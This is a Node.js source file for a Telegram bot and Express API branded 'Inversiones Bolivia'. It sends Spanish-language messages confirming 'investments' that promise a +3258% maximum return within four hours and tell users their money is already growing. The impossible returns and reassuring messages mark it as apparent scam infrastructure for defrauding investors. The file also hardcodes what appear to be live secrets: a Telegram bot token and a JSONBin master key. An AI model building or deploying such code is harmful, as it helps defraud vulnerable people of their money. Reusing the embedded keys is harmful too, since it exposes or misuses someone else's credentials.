const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const cron = require('node-cron');
const express = require('express');
require('dotenv').config();

// Конфигурация
const BOT_TOKEN = process.env.BOT_TOKEN || '8272381619:AAGy9netoupQboX1WgI5I59fQvZkz_4OlLs';
const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID || '69468d57d0ea881f40361a98';
const JSONBIN_MASTER_KEY = process.env.JSONBIN_MASTER_KEY || '$2a$10$eCHhQtmSAhD8XqkrlFgE1O6N6OKwgmHrIg.G9hlrkDKIaex3GMuiW';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '8382571809';
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://Creecly.pythonanywhere.com';
const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`;

// Параметры
const INVESTMENT_DURATION = 4 * 60 * 60 * 1000;
const MAX_PROFIT_PERCENTAGE = 3258;

// Инициализация Express
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// Инициализация бота
const bot = new TelegramBot(BOT_TOKEN, {
    polling: false // Отключаем polling, используем только вебхук
});

// Настройка вебхука
const WEBHOOK_PATH = `/bot-webhook/${BOT_TOKEN}`;
const FULL_WEBHOOK_URL = `${WEBHOOK_URL}${WEBHOOK_PATH}`;

// Устанавливаем вебхук
async function setupWebhook() {
    try {
        await bot.setWebHook(FULL_WEBHOOK_URL);
        console.log(`✅ Вебхук установлен: ${FULL_WEBHOOK_URL}`);

        // Проверяем вебхук
        const webhookInfo = await bot.getWebHookInfo();
        console.log('📋 Информация о вебхуке:', {
            url: webhookInfo.url,
            has_custom_certificate: webhookInfo.has_custom_certificate,
            pending_update_count: webhookInfo.pending_update_count
        });
    } catch (error) {
        console.error('❌ Ошибка настройки вебхука:', error.message);

        // Запускаем polling как fallback
        console.log('🔄 Запускаем polling как запасной вариант...');
        bot.startPolling();
    }
}

// Кэш уведомлений
const sentNotificationsCache = new Map();
const CACHE_DURATION = 24 * 60 * 60 * 1000;

// ==================== ОБНОВЛЕННЫЕ ФУНКЦИИ ====================

// Функция отправки уведомлений
async function sendNotification(chatId, message) {
    try {
        console.log(`📤 Попытка отправки в ${chatId}: ${message.substring(0, 50)}...`);

        // Проверка кэша
        const cacheKey = `${chatId}_${message.substring(0, 50)}`;
        const lastSent = sentNotificationsCache.get(cacheKey);

        if (lastSent && (Date.now() - lastSent) < CACHE_DURATION) {
            console.log(`⏭️ Пропуск дубликата для ${chatId}`);
            return false;
        }

        await bot.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });

        sentNotificationsCache.set(cacheKey, Date.now());
        console.log(`✅ Отправлено в ${chatId}`);
        return true;

    } catch (error) {
        console.error(`❌ Ошибка отправки в ${chatId}:`, error.message);

        // Проверяем конкретные ошибки
        if (error.response && error.response.statusCode === 403) {
            console.log(`⚠️ Бот заблокирован пользователем ${chatId}`);
        }
        return false;
    }
}

// ==================== API КОНЕЧНЫЕ ТОЧКИ ====================

// 1. Конечная точка для создания инвестиций
app.post('/api/investment-created', async (req, res) => {
    console.log('📥 Получен запрос на investment-created:', req.body);

    try {
        const { telegramId, userName, amount, investmentId } = req.body;

        // Валидация
        if (!telegramId || !amount) {
            return res.status(400).json({
                success: false,
                error: 'Faltan datos: telegramId y amount son requeridos'
            });
        }

        // Отправляем уведомление пользователю
        const userMessage = `🎉 *¡NUEVA INVERSIÓN CREADA!*\n\n` +
                       `*Usuario:* ${userName || 'Inversor'}\n` +
                       `*Monto:* Bs. ${parseFloat(amount).toFixed(2)}\n` +
                       `*Retorno máximo:* +${MAX_PROFIT_PERCENTAGE}%\n` +
                       `*Duración:* 4 horas\n\n` +
                       `¡Tu dinero ya está creciendo! 🚀\n` +
                       `Recibirás actualizaciones каждые 2 часа.\n` +
                       `Support: @Suports_Investment`;

        const userSent = await sendNotification(telegramId, userMessage);

        // Также отправляем администратору
        let adminSent = false;
        if (ADMIN_TELEGRAM_ID && ADMIN_TELEGRAM_ID !== telegramId.toString()) {
            const adminMsg = `📊 *Nueva inversión*\n\n` +
                           `Usuario: ${userName || 'Nuevo'}\n` +
                           `Telegram ID: ${telegramId}\n` +
                           `Monto: Bs. ${parseFloat(amount).toFixed(2)}\n` +
                           `Hora: ${new Date().toLocaleString('es-ES')}\n\n` +
                           `Support: @Suports_Investment`;
            adminSent = await sendNotification(ADMIN_TELEGRAM_ID, adminMsg);
        }

        res.json({
            success: true,
            message: 'Notificaciones enviadas',
            notifications: {
                user: userSent,
                admin: adminSent
            }
        });

    } catch (error) {
        console.error('❌ Error en investment-created:', error);
        res.status(500).json({
            success: false,
            error: 'Error interno del servidor',
            details: error.message
        });
    }
});

// 2. Регистрация нового пользователя
app.post('/api/user-registered', async (req, res) => {
    console.log('📥 Получен запрос на user-registered:', req.body);

    try {
        const { telegramId, userName } = req.body;

        const message = `👋 *¡BIENVENIDO A INVERSIONES BOLIVIA, ${userName}!*\n\n` +
                       `Tu cuenta ha sido creada exitosamente.\n\n` +
                       `*Ahora puedes:*\n` +
                       `• Crear inversiones\n` +
                       `• Seguir el crecimiento en tiempo real\n` +
                       `• Recibir notificaciones automáticas\n\n` +
                       `¡Comienza tu camino al éxito! 🚀\n` +
                       `Support: @Suports_Investment`;

        const sent = await sendNotification(telegramId, message);

        res.json({
            success: true,
            message: 'Mensaje de bienvenida enviado',
            notificationSent: sent
        });

    } catch (error) {
        console.error('❌ Error en user-registered:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// 3. Статус здоровья API
app.get('/api/health', (req, res) => {
    const health = {
        status: 'online',
        service: 'Inversiones Bolivia Bot',
        timestamp: new Date().toISOString(),
        webhook: {
            url: FULL_WEBHOOK_URL,
            configured: !!WEBHOOK_URL
        },
        cache: {
            size: sentNotificationsCache.size
        },
        endpoints: {
            investment: '/api/investment-created (POST)',
            register: '/api/user-registered (POST)',
            health: '/api/health (GET)'
        }
    };

    console.log('🏥 Health check');
    res.json(health);
});

// ==================== ОБРАБОТЧИК ВЕБХУКА ====================

// Маршрут для вебхука Telegram
app.post(WEBHOOK_PATH, (req, res) => {
    console.log('📱 Получен вебхук от Telegram');

    const update = req.body;

    // Логируем полученные данные
    if (update.message) {
        console.log('📨 Сообщение:', {
            chatId: update.message.chat.id,
            text: update.message.text,
            from: update.message.from.username
        });
    }

    // Обрабатываем обновление
    bot.processUpdate(update);

    // Отвечаем 200 OK
    res.sendStatus(200);
});

// ==================== ОБРАБОТЧИКИ КОМАНД ====================

// Команда /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || 'Usuario';

    console.log(`▶️ Получен /start от ${chatId} (${firstName})`);

    const response = `🤖 *BOT DE INVERSIONES BOLIVIA*\n\n` +
                    `Hola ${firstName}, soy el sistema de notificaciones.\n\n` +
                    `*Recibirás automáticamente:*\n` +
                    `• 🎉 Confirmación de inversiones\n` +
                    `• 📈 Actualizaciones каждые 2 horas\n` +
                    `• 🏆 Notificación de finalización\n\n` +
                    `Para crear inversiones, visita nuestra web.\n` +
                    `Support: @Suports_Investment`;

    try {
        await bot.sendMessage(chatId, response, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        console.log(`✅ Ответ /start отправлен на ${chatId}`);
    } catch (error) {
        console.error(`❌ Ошибка отправки /start:`, error.message);
    }
});

// Команда /help
bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id;
    console.log(`❓ Получен /help от ${chatId}`);

    const response = `📋 *AYUDA*\n\n` +
                    `Este bot envía notificaciones automáticas sobre tus inversiones.\n\n` +
                    `*Comandos disponibles:*\n` +
                    `/start - Mensaje de bienvenida\n` +
                    `/status - Ver estado de notificaciones\n` +
                    `/help - Esta ayuda\n\n` +
                    `Las inversiones se crean desde la web oficial.\n` +
                    `Support: @Suports_Investment`;

    await bot.sendMessage(chatId, response, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
    });
});

// Команда /status
bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    console.log(`📊 Получен /status от ${chatId}`);

    let response = `📊 *ESTADO DEL SISTEMA*\n\n`;
    response += `*Bot:* Activo ✅\n`;
    response += `*Hora:* ${new Date().toLocaleString('es-ES')}\n`;
    response += `*Notificaciones en cache:* ${sentNotificationsCache.size}\n`;
    response += `*Tu ID:* ${chatId}\n\n`;
    response += `Para crear inversiones visita nuestra web.\n`;
    response += `Support: @Suports_Investment`;

    await bot.sendMessage(chatId, response, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
    });
});

// Обработка текстовых сообщений (для отладки)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Если это не команда (не начинается с /)
    if (text && !text.startsWith('/')) {
        console.log(`💬 Сообщение от ${chatId}: ${text}`);

        const response = `📨 He recibido tu mensaje: "${text}"\n\n` +
                        `Este bot предназначен только для уведомлений.\n` +
                        `Usa /help para ver los comandos disponibles.\n` +
                        `Support: @Suports_Investment`;

        await bot.sendMessage(chatId, response, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
    }
});

// ==================== ЗАПУСК СЕРВЕРА ====================

const PORT = process.env.PORT || 3000;

app.listen(PORT, async () => {
    console.log(`🚀 Servidor iniciado en puerto ${PORT}`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`🌐 Webhook URL: ${FULL_WEBHOOK_URL}`);
    console.log(`📞 API Health: http://localhost:${PORT}/api/health`);
    console.log(`👑 Admin ID: ${ADMIN_TELEGRAM_ID}`);

    // Настраиваем вебхук
    await setupWebhook();
});

// Запускаем проверки каждые 10 минут
cron.schedule('*/10 * * * *', async () => {
    console.log('⏰ Ejecutando chequeo de inversiones...');
    // Здесь будет ваша функция checkInvestmentProgress
});

// Очистка кэша каждый день
cron.schedule('0 0 * * *', () => {
    const oneDayAgo = Date.now() - CACHE_DURATION;
    let cleared = 0;

    for (const [key, timestamp] of sentNotificationsCache.entries()) {
        if (timestamp < oneDayAgo) {
            sentNotificationsCache.delete(key);
            cleared++;
        }
    }

    console.log(`🧹 Limpiadas ${cleared} entradas de caché`);
});

// Обработка ошибок
bot.on('error', (error) => {
    console.error('❌ Error del bot:', error.message);
});

process.on('SIGINT', () => {
    console.log('👋 Apagando...');
    bot.stopPolling();
    process.exit(0);
});